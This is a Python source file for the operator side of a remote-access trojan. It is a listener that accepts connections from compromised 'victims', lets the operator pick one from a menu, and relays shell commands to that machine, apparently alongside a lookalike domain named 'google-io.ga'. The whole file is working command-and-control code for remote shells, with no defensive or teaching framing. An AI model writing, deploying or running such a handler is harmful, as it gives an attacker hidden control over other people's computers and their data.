#!/usr/bin/env python3

import socket
import threading
import time
import os
from bullet import ScrollBar, utils

BUFFER_SIZE = 1025
PORT = 8080
DNS = 'google-io.ga'

# Scroll Input
SCROLL_HEIGHT = 5
REFRESH = 'refresh'
QUIT = 'quit'

victims = dict()
server = None

def wait_victims():
    utils.clearConsoleDown(1)
    print('awaiting connections ...')
    time.sleep(1)
    while not victims:
        time.sleep(1)

def select_users():
    user_choice = None

    while True:
        wait_victims()
        choices = [QUIT, REFRESH, *victims]
        cli = ScrollBar('Select your victim :'
                        , choices=choices
                        , height=SCROLL_HEIGHT)
        user_choice = cli.launch()
        utils.clearConsoleUp(SCROLL_HEIGHT)
        if user_choice == QUIT:
            return None
        if user_choice != REFRESH:
            print(f'You have selected \'{user_choice}\'.')
            return victims.get(user_choice)

def listen():
    global server
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('', PORT))
    server.listen()
    while True:
        try:
            victim = server.accept()[0]
            username = victim.recv(BUFFER_SIZE).decode()
            victims[username] = victim
        except:
            break

def shell(socket: socket.socket):
    print('You are now in the target computer 🤫')
    while True:
        try:
            cmd = input('> ')
            socket.send(cmd.encode())
            output = socket.recv(BUFFER_SIZE)
            print(output.decode())
        except:
            break


def main():
    threading.Thread(target=listen).start()
    selected_user = select_users()
    if not selected_user:
        server.close()
    else:
        shell(selected_user)

if __name__ == '__main__':
    main()
